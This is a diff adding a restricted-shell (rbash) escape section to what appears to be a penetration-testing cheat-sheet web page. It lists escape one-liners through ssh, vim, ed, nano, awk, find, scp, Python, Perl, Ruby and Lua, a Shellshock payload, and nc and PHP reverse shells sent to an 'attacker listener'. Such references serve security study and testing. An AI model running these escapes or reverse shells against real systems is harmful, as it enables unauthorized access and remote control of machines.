@@ -119,6 +119,54 @@ nvme0n1     259:0    0 238.5G  0 disk
 <p>Other linux machines you may see different disk name like /dev/sda1, important part is you need to look at mountpoints in my case nvme0n1p2 mounted to /</p>
 <h1>Restricted shell escape</h1>
 <p>With it's own name it is restricted shell we can not even use full capabilities of normal user with restricted shell often known as <code>rbash</code></p>
+<p>Keytrick: If we have something which can execute command, we can probably escape restricted shell by executing <code>bash</code></p>
+<h2>From outside</h2>
+<h3>Execute command before remote shell loaded:</h3>
+<pre><code>ssh target@192.168.0.20 -t "/bin/sh"</code></pre>
+<h3>Start a remote shell with unrestricted profile:</h3>
+<pre><code>ssh target@192.168.0.20 -t "bash --noprofile"</code></pre>
+<h3>Shellshock example:</h3>
+<pre><code>ssh target@192.168.0.20 -t "(){:;}; /bin/bash"</code></pre>
+<h2>Using available commands</h2>
+<h3>Vim</h3>
+<p>Shell</p>
+<pre><code>:set shell=/bin/bash
+:shell</code></pre>
+<p>Executing commands</p>
+<pre><code>:! /usr/bin/whoami</code></pre>
+<h2>Editor: ed</h2>
+<pre><code>ed
+!'/bin/bash'
+</code></pre>
+<h2>Using nano</h2>
+<pre><code>nano
+Ctrl+R and Ctrl+X
+reset; sh 1>&0 2>&0</code></pre>
+<h2>Using awk</h2>
+<pre><code>awk 'BEGIN {system("/bin/sh")}'</code></pre>
+<h2>Using find</h2>
+<pre><code>find / -name 0xffsec -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;</code></pre>
+<h2>Using scp</h2>
+<pre><code>echo $'#!/bin/sh\n/usr/bin/id' > script.sh
+chmod +x script.sh
+scp -S ./script validfile remote:</code></pre>
+<h2>Using netcat</h2>
+<p>Sending reverse shell to attacker listener:</p>
+<pre><code>nc 192.168.0.10 1337 -e /bin/bash</code></pre>
+<h1>Languages</h1>
+<h2>Python</h2>
+<pre><code>exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()</code></pre>
+<h2>PHP</h2>
+<p>Sending reverse shell to attacker listener</p>
+<pre><code>php -r '$sock=fsockopen("192.168.0.10",1337);exec("/bin/bash -i <&3 >&3 2>&3");'</code></pre>
+<h2>Perl</h2>
+<pre><code>perl -e 'exec "/bin/sh";'</code></pre>
+<p>Another options with perl</p>
+<pre><code>exec "/bin/sh";</code></pre>
+<h2>Ruby</h2>
+<pre><code>exec "/bin/sh"</code></pre>
+<h2>Lua</h2>
+<pre><code>os.execute('/bin/sh')</code></pre>
       </div>
     </article>
   </div>
